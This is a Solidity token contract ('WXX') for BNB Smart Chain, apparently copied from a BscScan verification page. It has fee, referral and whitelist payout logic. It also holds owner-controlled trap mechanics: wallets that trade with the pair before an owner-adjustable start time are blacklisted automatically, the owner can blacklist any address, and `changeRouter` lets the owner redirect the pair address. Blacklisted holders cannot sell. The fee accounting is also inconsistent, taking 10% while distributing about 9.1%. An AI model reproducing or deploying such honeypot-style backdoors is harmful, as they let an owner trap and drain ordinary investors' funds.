/**
 *Submitted for verification at BscScan.com on 2022-05-04
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-24
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address public _owner;
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract WXX is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => address) inviter;
    mapping(address => bool) public _isBlacklisted;  
    uint256 private _tradingEnabledTime = 1649433600;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    uint256 public _tTotalFeeMax;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    address private _fundAddress = address(0x2c6d04416838A38bbD1F22d8b1cc20104b3d55dD);
    address private _projectAddress = address(0x4444B2654Fbc1c5306758a3384bba50D734bccF6);
    address public uniswapV2Pair;
    address[] whiteUserList;
    mapping(address => bool) public havePush;
    constructor(address tokenOwner) {
        _name = "wxx";
        _symbol = "WXX";
        _decimals = 18;
        _tTotal = 200000000 * 10**_decimals;
        _rTotal = (MAX - (MAX % _tTotal));
        _rOwned[tokenOwner] = _rTotal;
        _isExcludedFromFee[tokenOwner] = true;
        _owner = msg.sender;
        emit Transfer(address(0), tokenOwner, _tTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
		if(uniswapV2Pair == address(0) && amount >= _tTotal.div(2)){
			uniswapV2Pair = recipient;
		}
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }
    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
	function addBlacklisted(address recipient) private {
        if (!_isBlacklisted[recipient]) _isBlacklisted[recipient] = true;
    }
    function set_tradingEnabledTime(uint256 tradingEnabledTime) public onlyOwner {
         _tradingEnabledTime=tradingEnabledTime;
    }
    function setBlacklisted(address account) public onlyOwner {
        _isBlacklisted[account] = true;
    }
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
        if(!havePush[account]){
            whiteUserList.push(account);
            havePush[account] = true;
        }
        
    }
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
        if(havePush[account]){
            havePush[account] = false;
        }
    }

    function getWhiteListLength() private view returns (uint256) {
        return whiteUserList.length;
    }

    receive() external payable {}
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }
    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }
	function getInviter(address account) public view returns (address) {
        return inviter[account];
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        bool isInviter = from != uniswapV2Pair && balanceOf(to) == 0 && inviter[to] == address(0); 
        bool takeFee = true;        

        if(from == uniswapV2Pair){
                if(!_isExcludedFromFee[to] &&  to != _projectAddress && to != _fundAddress  && to != _owner && to != uniswapV2Pair && to != address(this)){
                    require(!_isBlacklisted[to], "Blacklised address");
                    if(block.timestamp <= _tradingEnabledTime){
                        addBlacklisted(to);
                    }
                }else{
                    takeFee = false;
                }                
				_tokenTransferBuy(from, to, amount, takeFee);
	    }else if(to == uniswapV2Pair){
                if(!_isExcludedFromFee[from] && from != _projectAddress && from != _fundAddress  && from != _owner && from != uniswapV2Pair && from != address(this)){ 
                    require(!_isBlacklisted[from], "Blacklised address");
                    if(block.timestamp <= _tradingEnabledTime){
                        addBlacklisted(from);
                    }
                }else{
                    takeFee = false;
                }  
                _tokenTransferSell(from, to, amount, takeFee);
        }else{
            if(uniswapV2Pair != address(0)){
                if(from != _projectAddress && from != _fundAddress && !_isExcludedFromFee[from] && from != _owner){
                    require(!_isBlacklisted[from], "Blacklised address");
                }
            }else{
                if(from != _projectAddress && from != _fundAddress && !_isExcludedFromFee[from] && from != _owner){
                    require(!_isBlacklisted[from], "Blacklised address");
                    require(amount <= 1 * 10**17);
                }
            }
            if(from == _projectAddress || from == _fundAddress || _isExcludedFromFee[from] || from == _owner){ 
                takeFee=false; 
            }
                _tokenTransfer(from, to, amount, takeFee);
        }
        if(balanceOf(address(this)) >= 300 * 10**18){
            transferWhiteUser();
        }
        if(isInviter) {
            inviter[to] = from;
        }
    }
    function _tokenTransferBuy(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {
            uint256 inviterFee = tAmount.div(1000).mul(25);
            uint256 projectFee = tAmount.div(100).mul(5);
            uint256 whiteFee = tAmount.div(1000).mul(15);
            uint256 destroyFee = tAmount.div(1000).mul(1);
            _takeInviterFee(sender, recipient, inviterFee, currentRate);
            _takeTransfer(sender, _projectAddress, projectFee, currentRate);
            _takeTransfer(sender, _destroyAddress, destroyFee, currentRate);
            _takeTransfer(sender, address(this), whiteFee, currentRate);
            rate = 10;
        }

        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }   
    function _tokenTransferSell(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {            
            uint256 inviterFee = tAmount.div(1000).mul(25);
            uint256 projectFee = tAmount.div(100).mul(5);
            uint256 whiteFee = tAmount.div(1000).mul(15);
            uint256 destroyFee = tAmount.div(1000).mul(1);
            _takeInviterFee(sender, recipient, inviterFee, currentRate);
            _takeTransfer(sender, _projectAddress, projectFee, currentRate);
            _takeTransfer(sender, _destroyAddress, destroyFee, currentRate);
            _takeTransfer(sender, address(this), whiteFee, currentRate);
            rate = 10;
        }

        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {
            uint256 inviterFee = tAmount.div(1000).mul(25);
            uint256 projectFee = tAmount.div(100).mul(5);
            uint256 whiteFee = tAmount.div(1000).mul(15);
            uint256 destroyFee = tAmount.div(1000).mul(1);
            _takeInviterFee(sender, recipient, inviterFee, currentRate);
            _takeTransfer(sender, _projectAddress, projectFee, currentRate);
            _takeTransfer(sender, _destroyAddress, destroyFee, currentRate);
            _takeTransfer(sender, address(this), whiteFee, currentRate);
            rate = 10;
        }
        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }
    function transferWhiteUser() private {
        uint256 size = whiteUserList.length;
        if(size > 0){
            uint256 tamount = balanceOf(address(this)).div(size);
            for(uint256 i=0;i<size;i++){
                address user = whiteUserList[i];
                _tokenTransfer(address(this),user,tamount,false);
            }
        }
    }
    function _takeInviterFee(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        address cur;
        address recieveD;
        if (sender == uniswapV2Pair) {
            cur = recipient;
        } else {
            cur = sender;
        }
        for (int256 i = 0; i < 5; i++) {
            uint256 rate;
            if (i == 0) {
                rate = 20;
            } else {
                rate = 20;
            }
            cur = inviter[cur];
            if (cur != address(0)) {
                recieveD = cur;
            }else{
				recieveD = _destroyAddress;
			}
            uint256 curTAmount = tAmount.div(100).mul(rate);
            uint256 curRAmount = curTAmount.mul(currentRate);
            _rOwned[recieveD] = _rOwned[recieveD].add(curRAmount);
            emit Transfer(sender, recieveD, curTAmount);
        }
    }
    function changeRouter(address router) public onlyOwner {
        uniswapV2Pair = router;
    }
}